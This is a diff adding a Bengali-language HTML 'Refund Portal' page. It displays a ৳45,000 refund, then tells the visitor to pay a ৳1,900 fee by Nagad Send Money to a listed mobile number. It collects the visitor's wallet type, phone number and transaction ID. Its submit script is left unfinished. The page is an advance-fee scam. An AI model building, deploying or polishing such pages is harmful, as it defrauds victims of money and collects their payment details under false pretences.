@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Refund Portal</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:linear-gradient(135deg,#e8f7f1,#eef2ff);
+  color:#182b36;
+}
+
+.container{
+  max-width:440px;
+  margin:25px auto;
+  padding:16px;
+}
+
+.card{
+  background:white;
+  border-radius:24px;
+  overflow:hidden;
+  box-shadow:0 15px 45px #123d321c;
+}
+
+.header{
+  background:linear-gradient(135deg,#073d32,#087f5b);
+  color:white;
+  padding:28px 22px;
+  text-align:center;
+}
+
+.logo{
+  width:65px;
+  height:65px;
+  margin:auto;
+  border-radius:20px;
+  background:#ffffff20;
+  display:grid;
+  place-items:center;
+  font-size:32px;
+}
+
+.header h1{
+  font-size:23px;
+  margin:14px 0 6px;
+}
+
+.header p{
+  margin:0;
+  color:#d6f5e8;
+  font-size:13px;
+}
+
+.content{padding:22px}
+
+.amount-card{
+  background:linear-gradient(135deg,#f0fdf4,#dcfce7);
+  border:1px solid #bbf7d0;
+  padding:20px;
+  border-radius:18px;
+  text-align:center;
+}
+
+.label{
+  color:#527064;
+  font-size:13px;
+}
+
+.amount{
+  color:#087f5b;
+  font-size:37px;
+  font-weight:800;
+  margin:10px 0;
+}
+
+.badge{
+  display:inline-block;
+  background:#fff7ed;
+  color:#9a3412;
+  border-radius:20px;
+  padding:7px 12px;
+  font-size:12px;
+}
+
+.section-title{
+  font-size:17px;
+  margin:24px 0 14px;
+}
+
+.payment{
+  padding:17px;
+  background:#f8fafc;
+  border:1px solid #e2e8f0;
+  border-radius:15px;
+}
+
+.payment small{
+  color:#64748b;
+}
+
+.number{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:8px;
+  margin-top:10px;
+  font-size:19px;
+  font-weight:bold;
+}
+
+.copy{
+  border:0;
+  background:#dcfce7;
+  color:#166534;
+  padding:9px 12px;
+  border-radius:8px;
+  cursor:pointer;
+}
+
+.fee{
+  display:flex;
+  justify-content:space-between;
+  gap:10px;
+  padding:14px 0;
+  border-bottom:1px solid #e2e8f0;
+  font-size:14px;
+}
+
+.fee strong{white-space:nowrap}
+
+.notice{
+  background:#fff7ed;
+  border:1px solid #fed7aa;
+  padding:13px;
+  border-radius:12px;
+  color:#9a3412;
+  font-size:12px;
+  line-height:1.8;
+  margin-top:18px;
+}
+
+label{
+  display:block;
+  font-size:14px;
+  font-weight:bold;
+  margin:18px 0 9px;
+}
+
+input{
+  width:100%;
+  border:1px solid #cbd5e1;
+  background:#fff;
+  padding:15px;
+  border-radius:11px;
+  font-size:15px;
+  outline:none;
+}
+
+input:focus{border-color:#087f5b}
+
+.submit{
+  width:100%;
+  margin-top:18px;
+  border:0;
+  padding:16px;
+  border-radius:12px;
+  background:linear-gradient(135deg,#087f5b,#065f46);
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+#result{
+  margin-top:14px;
+  font-size:13px;
+  line-height:1.7;
+}
+
+.footer{
+  text-align:center;
+  padding:16px;
+  background:#f8fafc;
+  color:#64748b;
+  font-size:11px;
+  line-height:1.8;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+<div class="card">
+
+  <header class="header">
+    <div class="logo">↩</div>
+    <h1>REFUND PORTAL</h1>
+    <p>Refund Information & Transaction Reference</p>
+  </header>
+
+  <main class="content">
+
+    <div class="amount-card">
+      <div class="label">উল্লেখিত রিফান্ডের পরিমাণ</div>
+      <div class="amount">৳ 45,000</div>
+      <span class="badge">রিফান্ড যাচাই সাপেক্ষে</span>
+    </div>
+
+    <h3 class="section-title">পেমেন্টের বিবরণ</h3>
+
+    <div class="payment">
+      <small>নগদ · Send Money</small>
+      <div class="number">
+        <span id="number">01319701625</span>
+        <button class="copy" onclick="copyNumber()">কপি</button>
+      </div>
+    </div>
+
+    <h3 class="section-title">ফি সংক্রান্ত বিবরণ</h3>
+
+    <div class="fee">
+      <span>প্রক্রিয়াকরণ ও অন্যান্য ফি</span>
+      <strong>৳ 1,900*</strong>
+    </div>
+
+    <div class="notice">
+      *১,৯০০ টাকা জমা করার সাথে সাথে টাকা পাবেন
+    </div>
+
+    <h3 class="section-title">ট্রানজেকশন রেফারেন্স</h3>
+<h3 class="section-title">রিফান্ড গ্রহণের মাধ্যম</h3>
+
+<label for="refundMethod">আপনি কোন মাধ্যমে টাকা গ্রহণ করবেন?</label>
+
+<select id="refundMethod" required
+style="width:100%;padding:15px;border:1px solid #cbd5e1;
+border-radius:11px;font-size:15px;background:white;">
+
+  <option value="">মাধ্যম নির্বাচন করুন</option>
+  <option value="Nagad">নগদ (Nagad)</option>
+  <option value="bKash">বিকাশ (bKash)</option>
+  <option value="Rocket">রকেট (Rocket)</option>
+
+</select>
+
+<label for="refundNumber">রিফান্ড গ্রহণের মোবাইল নম্বর</label>
+
+<input
+  id="refundNumber"
+  type="tel"
+  inputmode="numeric"
+  placeholder="01XXXXXXXXX"
+  pattern="01[0-9]{9}"
+  maxlength="11"
+  required
+>
+    <form id="form">
+      <label for="trx">Transaction ID (TrxID)</label>
+      <input id="trx" type="text"
+        placeholder="আপনার TrxID লিখুন" required>
+
+      <button class="submit" type="submit">
+        তথ্য যাচাই করুন →
+      </button>
+    </form>
+
+    <div id="result" role="status"></div>
+
+  </main>
+
+  <footer class="footer">
+    Refund Information Portal<br>
+   
+  </footer>
+
+</div>
+</div>
+
+<script>
+function copyNumber(){
+  const number = "01319701625";
+
+  if(navigator.clipboard && window.isSecureContext){
+    navigator.clipboard.writeText(number)
+      .then(()=>alert("নম্বর কপি হয়েছে"))
+      .catch(()=>alert("নগদ নম্বর: " + number));
+  }else{
+    alert("নগদ নম্বর: " + number);
+  }
+}
+
+document.getElementById("form").addEventListener(
+  "submit", function(e){
+    e.preventDefault();
+
+    document.getElementById("result").textContent =
+   
+  }
+);
+</script>
+</body>
+  </html>
